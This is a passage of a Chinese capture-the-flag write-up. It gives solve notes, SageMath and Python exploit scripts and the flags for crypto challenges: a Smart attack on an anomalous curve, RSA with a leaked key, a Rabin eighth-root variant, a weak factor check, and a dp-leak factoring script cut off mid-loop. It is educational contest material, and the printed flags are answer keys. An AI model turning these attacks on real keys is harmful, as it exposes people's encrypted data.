</span></span><span class="line"><span class="cl"><span class="n">A</span> <span class="o">=</span> <span class="mh">0x1ef1e93d0f9acda1b7c0172f27d28f3a7d0f2d9343513a3aac191e12f6e51123</span>
</span></span><span class="line"><span class="cl"><span class="n">B</span> <span class="o">=</span> <span class="mh">0xcad65954bbe0fb8f2f9c22b5cae1aa42306fd58e8394652818e781e5f808e17a</span>
</span></span><span class="line"><span class="cl"><span class="n">E</span> <span class="o">=</span> <span class="n">EllipticCurve</span><span class="p">(</span><span class="n">GF</span><span class="p">(</span><span class="n">p</span><span class="p">),[</span><span class="n">A</span><span class="p">,</span><span class="n">B</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">P</span> <span class="o">=</span> <span class="n">E</span><span class="p">(</span><span class="mh">0x708c0cf66f132122f3fcd1f75c6f22d4a90d34650dd81fb3a57b75dad98d35e7</span><span class="p">,</span><span class="mh">0xcfb017daf37cbba3c6a5c6e7c4327692595c16b47e4bfa1ad400bffe5b500fba</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">Q</span> <span class="o">=</span> <span class="n">E</span><span class="p">(</span><span class="mi">97490713033364940809544067604441149095210096571946998449251275861394744757515</span><span class="p">,</span><span class="mi">32198694245056943922016695558131047889851279706531342583322750112905104448879</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">SmartAttack</span><span class="p">(</span><span class="n">P</span><span class="p">,</span><span class="n">Q</span><span class="p">,</span><span class="n">p</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">E</span> <span class="o">=</span> <span class="n">P</span><span class="o">.</span><span class="n">curve</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">Eqp</span> <span class="o">=</span> <span class="n">EllipticCurve</span><span class="p">(</span><span class="n">Qp</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">2</span><span class="p">),</span> <span class="p">[</span> <span class="n">ZZ</span><span class="p">(</span><span class="n">t</span><span class="p">)</span> <span class="o">+</span> <span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">p</span><span class="p">)</span><span class="o">*</span><span class="n">p</span> <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">E</span><span class="o">.</span><span class="n">a_invariants</span><span class="p">()</span> <span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">P_Qps</span> <span class="o">=</span> <span class="n">Eqp</span><span class="o">.</span><span class="n">lift_x</span><span class="p">(</span><span class="n">ZZ</span><span class="p">(</span><span class="n">P</span><span class="o">.</span><span class="n">xy</span><span class="p">()[</span><span class="mi">0</span><span class="p">]),</span> <span class="nb">all</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">P_Qp</span> <span class="ow">in</span> <span class="n">P_Qps</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">GF</span><span class="p">(</span><span class="n">p</span><span class="p">)(</span><span class="n">P_Qp</span><span class="o">.</span><span class="n">xy</span><span class="p">()[</span><span class="mi">1</span><span class="p">])</span> <span class="o">==</span> <span class="n">P</span><span class="o">.</span><span class="n">xy</span><span class="p">()[</span><span class="mi">1</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">Q_Qps</span> <span class="o">=</span> <span class="n">Eqp</span><span class="o">.</span><span class="n">lift_x</span><span class="p">(</span><span class="n">ZZ</span><span class="p">(</span><span class="n">Q</span><span class="o">.</span><span class="n">xy</span><span class="p">()[</span><span class="mi">0</span><span class="p">]),</span> <span class="nb">all</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">Q_Qp</span> <span class="ow">in</span> <span class="n">Q_Qps</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">GF</span><span class="p">(</span><span class="n">p</span><span class="p">)(</span><span class="n">Q_Qp</span><span class="o">.</span><span class="n">xy</span><span class="p">()[</span><span class="mi">1</span><span class="p">])</span> <span class="o">==</span> <span class="n">Q</span><span class="o">.</span><span class="n">xy</span><span class="p">()[</span><span class="mi">1</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">p_times_P</span> <span class="o">=</span> <span class="n">p</span><span class="o">*</span><span class="n">P_Qp</span>
</span></span><span class="line"><span class="cl">    <span class="n">p_times_Q</span> <span class="o">=</span> <span class="n">p</span><span class="o">*</span><span class="n">Q_Qp</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">x_P</span><span class="p">,</span><span class="n">y_P</span> <span class="o">=</span> <span class="n">p_times_P</span><span class="o">.</span><span class="n">xy</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">x_Q</span><span class="p">,</span><span class="n">y_Q</span> <span class="o">=</span> <span class="n">p_times_Q</span><span class="o">.</span><span class="n">xy</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">phi_P</span> <span class="o">=</span> <span class="o">-</span><span class="p">(</span><span class="n">x_P</span><span class="o">/</span><span class="n">y_P</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">phi_Q</span> <span class="o">=</span> <span class="o">-</span><span class="p">(</span><span class="n">x_Q</span><span class="o">/</span><span class="n">y_Q</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">k</span> <span class="o">=</span> <span class="n">phi_Q</span><span class="o">/</span><span class="n">phi_P</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ZZ</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">SmartAttack</span><span class="p">(</span><span class="n">P</span><span class="p">,</span> <span class="n">Q</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">flag</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="flag-18">flag
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SYC{@n()ma1ou$_cu2ves_r!sky}
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pem">pem
</h3><h4 id="解题记录-4">解题记录
</h4><p>key.pem和enc都有，直接解RSA</p>
<h4 id="exp-25">exp
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">PKCS1_OAEP</span><span class="p">,</span> <span class="n">PKCS1_v1_5</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">long_to_bytes</span><span class="p">,</span> <span class="n">bytes_to_long</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;key.pem&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">private_key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">import_key</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;enc&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">ct_int</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">pt_int</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">ct_int</span><span class="p">,</span> <span class="n">private_key</span><span class="o">.</span><span class="n">d</span><span class="p">,</span> <span class="n">private_key</span><span class="o">.</span><span class="n">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">plaintext</span> <span class="o">=</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="n">pt_int</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;flag: </span><span class="si">{</span><span class="n">plaintext</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s1">&#39;ignore&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;error: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="flag-19">flag
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SYC{PEM_1s_n0t_only_S5l}
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="baby_rabin">baby_rabin
</h3><h4 id="解题记录-5">解题记录
</h4><p>直接用factordb分解p,q,直接解m</p>
<h4 id="exp-26">exp
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">gmpy2</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">long_to_bytes</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">itertools</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">find_8th_roots_mod_prime</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">p</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">roots</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="n">r1</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="o">.</span><span class="n">powmod</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="p">(</span><span class="n">p</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">//</span> <span class="mi">4</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">roots</span><span class="o">.</span><span class="n">extend</span><span class="p">([</span><span class="n">r1</span><span class="p">,</span> <span class="n">p</span> <span class="o">-</span> <span class="n">r1</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="n">fourth_roots</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">root</span> <span class="ow">in</span> <span class="n">roots</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">fr</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="o">.</span><span class="n">powmod</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="p">(</span><span class="n">p</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">//</span> <span class="mi">4</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">fourth_roots</span><span class="o">.</span><span class="n">extend</span><span class="p">([</span><span class="n">fr</span><span class="p">,</span> <span class="n">p</span> <span class="o">-</span> <span class="n">fr</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="n">eighth_roots</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">root</span> <span class="ow">in</span> <span class="n">fourth_roots</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">er</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="o">.</span><span class="n">powmod</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="p">(</span><span class="n">p</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">//</span> <span class="mi">4</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">eighth_roots</span><span class="o">.</span><span class="n">extend</span><span class="p">([</span><span class="n">er</span><span class="p">,</span> <span class="n">p</span> <span class="o">-</span> <span class="n">er</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">list</span><span class="p">(</span><span class="nb">set</span><span class="p">(</span><span class="n">eighth_roots</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">crt</span><span class="p">(</span><span class="n">remainders</span><span class="p">,</span> <span class="n">moduli</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">total</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">prod</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="n">moduli</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">prod</span> <span class="o">*=</span> <span class="n">m</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">r_i</span><span class="p">,</span> <span class="n">m_i</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">remainders</span><span class="p">,</span> <span class="n">moduli</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">p</span> <span class="o">=</span> <span class="n">prod</span> <span class="o">//</span> <span class="n">m_i</span>
</span></span><span class="line"><span class="cl">        <span class="n">total</span> <span class="o">+=</span> <span class="n">r_i</span> <span class="o">*</span> <span class="n">gmpy2</span><span class="o">.</span><span class="n">invert</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">m_i</span><span class="p">)</span> <span class="o">*</span> <span class="n">p</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">total</span> <span class="o">%</span> <span class="n">prod</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">C</span><span class="o">=</span><span class="mi">451731346880007131332999430306985234187530419447859396067624968918101700861978676040615622417464916959678829732066195225132545956101693588984833424213755513877236702139360270137668415610295492436471366218119012903840729628449361663941761372974624789549775182866112541811446267811259781269568865266459437049508062916974638523947634702667929562107001830919422408810565410106056693018550877651160930860996772712877149329227066558481842344525735406568814917991752005</span>
</span></span><span class="line"><span class="cl">    <span class="n">n</span><span class="o">=</span><span class="mi">491917847075013900815069309520768928274976990404751846981543204333198666419468384809286945880906855848713238459489821614928060098982194326560178675579884014989600009897895019721278191710357177079087876324831068589971763176646200619528739550876421709762258644696629617862167991346900122049024287039400659899610706153110527311944790794239992462632602379626260229348762760395449238458507745619804388510205772573967935937419407673995019892908904432789586779953769907</span>
</span></span><span class="line"><span class="cl">    <span class="n">hint</span><span class="o">=</span><span class="mi">66035251530240295423188999524554429498804416520951289016547753908652377333150838269168825344004730830028024338415783274479674378412532765763584271087554367024433779628323692638506285635583547190049386810983085033061336995321777237180762044362497604095831885258146390576684671783882528186837336673907983527353</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="mi">8126207696720549329082137712377866763714498107449360320398058077477163232178648217462900996288494410540148868460607029478677856276076857845820034721107771</span>
</span></span><span class="line"><span class="cl">    <span class="n">q</span> <span class="o">=</span> <span class="mi">8126207696720549329082137712377866763714498107449360320398058077477163232178648217462900996290101348584407858736148991571019018878599060839602827556409243</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">n</span> <span class="o">//</span> <span class="n">hint</span>
</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="n">p</span> <span class="o">%</span> <span class="mi">4</span> <span class="o">==</span> <span class="mi">3</span> <span class="ow">and</span> <span class="n">q</span> <span class="o">%</span> <span class="mi">4</span> <span class="o">==</span> <span class="mi">3</span> <span class="ow">and</span> <span class="n">r</span> <span class="o">%</span> <span class="mi">4</span> <span class="o">==</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl">    <span class="n">roots_p</span> <span class="o">=</span> <span class="n">find_8th_roots_mod_prime</span><span class="p">(</span><span class="n">C</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">roots_q</span> <span class="o">=</span> <span class="n">find_8th_roots_mod_prime</span><span class="p">(</span><span class="n">C</span><span class="p">,</span> <span class="n">q</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl">    <span class="n">roots_r</span> <span class="o">=</span> <span class="n">find_8th_roots_mod_prime</span><span class="p">(</span><span class="n">C</span><span class="p">,</span> <span class="n">r</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">moduli</span> <span class="o">=</span> <span class="p">[</span><span class="n">p</span><span class="p">,</span> <span class="n">q</span><span class="p">,</span> <span class="n">r</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">found_flag</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">    <span class="n">total_combinations</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">roots_p</span><span class="p">)</span> <span class="o">*</span> <span class="nb">len</span><span class="p">(</span><span class="n">roots_q</span><span class="p">)</span> <span class="o">*</span> <span class="nb">len</span><span class="p">(</span><span class="n">roots_r</span><span class="p">)</span>   
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="p">(</span><span class="n">rp</span><span class="p">,</span> <span class="n">rq</span><span class="p">,</span> <span class="n">rr</span><span class="p">)</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">itertools</span><span class="o">.</span><span class="n">product</span><span class="p">(</span><span class="n">roots_p</span><span class="p">,</span> <span class="n">roots_q</span><span class="p">,</span> <span class="n">roots_r</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">        <span class="n">solution</span> <span class="o">=</span> <span class="n">crt</span><span class="p">([</span><span class="n">rp</span><span class="p">,</span> <span class="n">rq</span><span class="p">,</span> <span class="n">rr</span><span class="p">],</span> <span class="n">moduli</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">candidate</span> <span class="o">=</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="n">solution</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="sa">b</span><span class="s1">&#39;flag&#39;</span> <span class="ow">in</span> <span class="n">candidate</span> <span class="ow">or</span> <span class="sa">b</span><span class="s1">&#39;ctf&#39;</span> <span class="ow">in</span> <span class="n">candidate</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">or</span> <span class="sa">b</span><span class="s1">&#39;{&#39;</span> <span class="ow">in</span> <span class="n">candidate</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;flag: </span><span class="si">{</span><span class="n">candidate</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">pass</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="xor_revenge">xor_revenge
</h3><h4 id="解题记录-6">解题记录
</h4><p>检查返回的n的因数只检查是否与n取余为0，直接把n发回去两次就行了</p>
<h4 id="flag-20">flag
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SYC{hahaha_th1_factor_is_N0t_ha16}
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="dp_spill">dp_spill
</h3><h4 id="解题记录-7">解题记录
</h4><p>选择一个小底数𝑎计算A=a^e%n,a^−1%n
对 d_p 从 1 到 2^BITS - 1
计算x = (A^d_p*a^-1)%n
g = gcd(x-1,n)
如果1&lt;g&lt;n,得到银因子p=g,q=n/p停止
然后p+q,计算sha256(p+q)</p>
<h4 id="exp-27">exp
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">n</span> <span class="o">=</span> <span class="mi">59802493250926859707985963604065644706006753432029457979480870189591634515944547801582044132550574140049396756158974108666587177618882259807156459782125677704143102175791607852135852403246382056816004306499712131698646815738798243056590111291799398438023345030391834782966046976995917844819454047154287312391</span>
</span></span><span class="line"><span class="cl"><span class="n">e</span> <span class="o">=</span> <span class="mi">55212884840887233646138079973875295799093171847359460085387084716906818593689341421818829383370282800231404248386041253598996862719171485530961860941585382910224531768283026267484780257269526617362183903996384696040145787076592207619279689647074176697837752679360230601598541884491676076657287130000027117241</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">GCD</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">BITS</span> <span class="o">=</span> <span class="mi">20</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">try_recover_factor</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">BITS</span><span class="p">,</span> <span class="n">bases</span><span class="o">=</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">11</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">bases</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">GCD</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">g</span> <span class="o">=</span> <span class="n">GCD</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="mi">1</span> <span class="o">&lt;</span> <span class="n">g</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="n">n</span><span class="o">//</span><span class="n">g</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">A</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">inv_a</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">ValueError</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">d_p</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">BITS</span><span class="p">):</span>
